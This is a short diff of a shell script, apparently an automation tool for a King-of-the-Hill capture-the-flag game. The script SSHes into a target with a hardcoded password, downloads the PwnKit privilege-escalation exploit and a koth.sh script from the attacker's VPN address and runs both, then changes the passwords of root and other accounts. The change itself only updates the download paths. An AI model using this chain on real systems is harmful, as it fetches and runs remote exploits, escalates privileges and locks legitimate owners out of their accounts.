@@ -30,8 +30,8 @@ vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
 sshpass -p batman ssh -o StrictHostKeychecking=no shifu@"$IP" << EOF
     bash -i
-    cd /tmp && wget http://$vpn/PwnKit && chmod +x PwnKit && ./PwnKit
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    cd /tmp && wget http://$vpn/bin/PwnKit && chmod +x PwnKit && ./PwnKit
+    cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "$new_password" | passwd --stdin root
     echo "$new_password" | passwd --stdin shifu
     echo "$new_password" | passwd --stdin tigress
